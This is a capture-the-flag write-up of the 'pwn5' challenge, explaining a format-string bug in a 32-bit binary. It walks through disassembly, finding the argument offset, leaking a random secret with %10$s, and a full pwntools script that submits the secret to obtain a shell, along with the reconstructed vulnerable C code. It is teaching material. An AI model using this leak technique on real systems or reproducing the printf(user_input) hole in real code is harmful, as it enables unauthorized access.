# PWN5 — [The Fifth Space 2019 Finals]

**Category:** Binary Exploitation / pwn
**Arch:** x86 (32-bit), dynamically linked, stripped, No PIE
**Technique:** Format String Vulnerability → Arbitrary Memory Read → Secret-value bypass (no stack overflow involved)

---

## 1. Recon

```bash
file ./pwn5
```

```
pwn5: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked,
interpreter /lib/ld-linux.so.2, stripped
```

```bash
checksec --file=pwn5
```

```
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
```

- **32-bit, cdecl** → arguments passed on the stack.
- **Stack canary present** — the first challenge in this series with one enabled. Normally this would mean any classic stack buffer overflow needs to either leak and replay the canary, or be avoided entirely.
- **No PIE** → every binary address (including a global variable storing a secret value, as it turns out) is fixed and known in advance.
- **Stripped** → no symbol table to shortcut function discovery with `nm`; the control flow has to be read directly from disassembly.

## 2. Reading `main` from raw disassembly

Since the binary is stripped, `main` has no name — it was located by following `__libc_start_main`'s third argument (the function pointer pushed right before the call), a standard way to find `main` in a stripped, non-PIE, dynamically linked binary. The relevant portion:

```asm
804920f: mov    %gs:0x14,%eax
8049215: mov    %eax,-0xc(%ebp)      ; canary stored at ebp-0xc

...
8049256: call   open@plt             ; open("/dev/urandom", O_RDONLY)
8049270: push   -0x84(%ebp)
8049276: call   read@plt             ; read(fd, &secret, 4)  -> secret @ 0x804c044

8049288: call   printf@plt           ; prints "your name:"
8049295: lea    -0x70(%ebp),%eax
8049299: push   $0x0
804929b: call   read@plt             ; read(0, name_buf, 0x63)

80492b8: lea    -0x70(%ebp),%eax
80492bb: push   %eax
80492bc: call   printf@plt           ; printf(name_buf)  <-- format string bug!

80492db: lea    -0x80(%ebp),%eax
80492df: push   $0x0
80492e1: call   read@plt             ; read(0, passwd_buf, 0xf)
80492ef: call   atoi@plt             ; atoi(passwd_buf)

8049300: mov    (%eax),%eax          ; load secret from 0x804c044
8049302: cmp    %eax,%edx            ; compare atoi(passwd_buf) == secret
8049304: je     804931a

804931a: ...
8049324: call   puts@plt             ; "ok!!"
8049336: call   system@plt           ; system(...)
```

## 3. Two separate findings, and why one makes the other unnecessary

**Finding A — a stack canary is present**, at `ebp-0xc`, checked just before `main` returns (`xor %gs:0x14,%ecx` near the end). A classic overflow-based approach would require leaking this value and replaying it in the payload before touching the saved return address.

**Finding B — a self-contained secret check**, entirely independent of any overflow:
1. The program reads 4 random bytes from `/dev/urandom` into a fixed global address (`0x804c044`).
2. It later reads a second line of user input, converts it with `atoi()`, and compares it directly against that stored secret.
3. If they match, it calls `system(...)` — a complete shell-granting path requiring no return-address control at all.

**Finding C — the actual bug**: the first `printf` call passes the user-controlled buffer directly as the *format string* itself (`printf(name_buf)` instead of the safe `printf("%s", name_buf)`). Since the secret's address (`0x804c044`) is fixed and known (No PIE), a format string bug is sufficient to **read it directly** rather than brute-forcing it — making the canary-bypass / ROP route completely unnecessary. This is the intended solution path.

## 4. Format string vulnerability — background

`printf("%s %d", a, b)` works because `printf` reads its *format string* argument first, and for every `%`-specifier it finds inside it, pulls the *next* argument off the stack (per the cdecl convention, where arguments are passed on the stack). Critically, `printf` has no independent way to know how many arguments were actually supplied — the format string itself is the only source of that count.

When user input is passed directly as the format string (`printf(user_input)`), any `%x`, `%p`, `%s`, etc. embedded in that input causes `printf` to read from the stack positions where it *expects* arguments to be — even though the caller never supplied any. Whatever happens to sit at those stack positions (saved registers, leftover local variables, pointers, often attacker-controlled data from earlier on the same stack frame) gets treated as a real argument and printed.

Two specifier families matter here:

- **`%x` / `%p`** — print the *value* found at that argument slot (useful for leaking raw stack contents, addresses, or even a canary).
- **`%s`** — treats the value at that argument slot as a *pointer*, and prints the null-terminated string found at that address. This is the key to reading arbitrary memory: if we can get a specific address we choose onto the stack at a known argument position, `%N$s` dereferences it for us.
- **Positional addressing (`%N$x`, `%N$s`)** jumps directly to argument number `N`, instead of requiring N sequential `%x`'s — much cleaner for exploit scripting once the right offset is known.

Format string bugs are a fundamentally different bug class from stack overflows: no memory corruption is required for the read primitive (`%x`/`%s`) — only a mismatch between what the format string expects and what was actually supplied as arguments.

## 5. Finding the argument offset

```bash
python3 -c "print('AAAA' + '.%x'*20)" | ./pwn5
```

```
Hello,AAAA.ffa97d98.63.0.f7f89ba0.3.f7f4a7b0.1.0.1.41414141.2e78252e...
```

Counting positions: the 10th `%x` printed `41414141` — exactly the `AAAA` marker placed at the start of the input buffer. So **argument position 10** (`%10$...`) refers directly to the beginning of our own input buffer.

## 6. Leaking the secret

With the offset known, the attack becomes: place the target address (`0x804c044`) as raw bytes at the very start of the input (so it occupies argument slot 10), then use `%10$s` to make `printf` dereference it and print the bytes stored there.

```python
payload = p32(0x0804c044) + b".%10$s"
```

`%s` is required here instead of `%x` — `%x` would only print the numeric value `0x0804c044` itself (the address we supplied), while `%s` follows that address and prints the actual bytes stored at it: the secret.

## 7. Debugging the local-vs-remote discrepancy

The exploit worked immediately against the local binary but hung indefinitely against the remote service. This turned out to be a two-part lesson in not trusting assumptions when scripting against a remote target:

**Step 1 — verify the offset itself hadn't changed.** Re-running the raw `%x` probe directly against the remote connection confirmed position 10 was still correct — so the vulnerability mechanics were identical; something else was wrong.

**Step 2 — stop guessing, capture raw output instead of waiting on an assumed string.** Replacing the blocking `recvuntil(b" your passwd:")` with a bounded `recvall(timeout=3)` revealed the actual issue:

```
b'Hello,D\xc0\x04\x08\xa6\xf5\xdf\xe9\n\xf8\xf7\x18\xb9\xf8\xf7@\xd3\xe6\xffR\x83\x04\x08your passwd:'
```

The remote server's prompt had **no leading space** before `your passwd:`, while the script was waiting on `" your passwd:"` (with a space) — a string that would never appear, causing `recvuntil` to block forever. This kind of exact-string mismatch is the same class of problem encountered earlier with `sendlineafter` in a prior challenge: any `recvuntil`/`sendlineafter` call blocks indefinitely if its expected string never literally appears, regardless of how close the actual output is.

A secondary correction was also needed: because `%s` reads until the first null byte, and the 4 leaked secret bytes happened to contain no null byte on this run, `%s` kept printing past the intended 4 bytes into adjacent memory. The fix was to explicitly slice `leaked[:4]` rather than assume the entire string returned by `%s` was exactly 4 bytes long.

**General lesson:** when a remote target behaves differently from a local one, the fastest way to find out why is to stop relying on blocking calls that wait for an assumed exact string, capture whatever actually comes back with a bounded timeout, and compare it byte-for-byte against what was expected — rather than guessing at environment differences (glibc version, buffering, banner text) without evidence.

## 8. Final exploit

```python
from pwn import *

context.arch = 'i386'

# p = process('./pwn5')
p = remote('<host>', <port>, ssl=True, sni='<host>')

leak_addr = 0x0804c044

# Stage 1: leak the secret via the format string bug
p.recvuntil(b"your name:")
payload = p32(leak_addr) + b"%10$s"
p.sendline(payload)

p.recvuntil(b"Hello,")
raw_addr_echo = p.recv(4)                       # echoed back address (4 bytes)
leaked = p.recvuntil(b"your passwd:", drop=True) # note: no leading space on remote

secret_bytes = leaked[:4]                        # take exactly the first 4 bytes
secret_unsigned = u32(secret_bytes)

# atoi() returns a signed int; if the high bit of the secret is set,
# the decimal value sent must be the signed interpretation so atoi()
# reconstructs the identical 32-bit pattern.
import struct
secret_signed = struct.unpack('<i', secret_bytes)[0]

print(f"[+] Leaked secret (hex):      {hex(secret_unsigned)}")
print(f"[+] Leaked secret (unsigned): {secret_unsigned}")
print(f"[+] Leaked secret (signed):   {secret_signed}")

# Stage 2: submit it back as the "password"
p.sendline(str(secret_signed).encode())
p.interactive()
```

**Result (both local and remote):**
```
ok!!
$ id
uid=1000(noop) gid=1000(noop) ...
```

## 9. Reconstructed C

```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <time.h>

int main(void)
{
    char name_buf[0x70];
    char passwd_buf[0xf];
    int fd;
    unsigned int secret;     // global, fixed address 0x804c044

    setvbuf(stdout, NULL, _IONBF, 0);

    srand(time(NULL));       // present in the binary; no clear use found in
                              // the reachable logic — likely leftover/defensive

    fd = open("/dev/urandom", O_RDONLY);
    read(fd, &secret, 4);

    printf("your name:");
    read(0, name_buf, 0x63);     // 99 bytes into a 112-byte buffer — not itself
                                   // an overflow; the real bug is below

    printf("Hello,");
    printf(name_buf);             // BUG: should be printf("%s", name_buf)

    printf("your passwd:");
    read(0, passwd_buf, 0xf);

    if (atoi(passwd_buf) == secret) {
        puts("ok!!");
        system("/bin/sh");
    } else {
        puts("fail");
    }

    return 0;
}
```

Note that the first `read()` call does *not* overflow its 112-byte buffer (it's capped at 99 bytes) — this challenge has no exploitable stack overflow at all. The stack canary present in `checksec`'s output is a red herring in the sense that the intended solution never touches it.

## 10. Tools used

| Tool | Purpose |
|---|---|
| `file` | Identify architecture, linking type, strip status |
| `checksec` | Check canary / NX / PIE / RELRO |
| `objdump -d` | Disassemble the whole binary (no symbols) and manually locate `main` via the `__libc_start_main` call pattern |
| raw `%x` probing (shell) | Determine the format-string argument offset for the input buffer |
| `pwntools` | Build the leak-and-submit exploit, both locally and against the remote service |

## 11. Key takeaways

- **Not every mitigation needs to be fought.** A stack canary being present doesn't mean a stack-overflow route is the intended — or necessary — path; a completely separate, unrelated bug (format string) can bypass the entire need for it.
- **`printf(user_input)` vs `printf("%s", user_input)`** is the entire difference between safe and critically vulnerable code. If user data can ever become the *format string* rather than an argument to one, the program is leaking (at minimum) stack contents to anyone who sends `%x`/`%p`/`%s` sequences.
- **Positional format specifiers (`%N$x`, `%N$s`) let an attacker target a specific stack argument directly**, which is essential for building a reliable, address-based read once the right offset is known.
- **`%s` dereferences a value as a pointer; `%x`/`%p` only print the raw value.** To read the contents of a specific, chosen memory address via a format string bug, that address must be placed where the format specifier will find it, and read with `%s`.
- **An offset/exploit confirmed locally should still be independently re-verified against the remote target** before assuming environment differences are the cause of a failure — re-running the raw probing step against the remote connection is cheap and removes a whole category of guesswork.
- **Blocking `recvuntil`/`sendlineafter` calls hang forever on an exact-string mismatch.** When debugging an unexpected remote failure, replacing them temporarily with a bounded `recvall(timeout=N)` and inspecting the raw bytes is the fastest way to find banner/prompt differences (such as a missing leading space) that would otherwise cause an indefinite hang with no useful error.
- **`%s` reads until a null byte, not a fixed length.** When slicing out a specific number of expected bytes from a format-string leak, explicitly truncate the result rather than assuming the returned string is exactly the expected length.
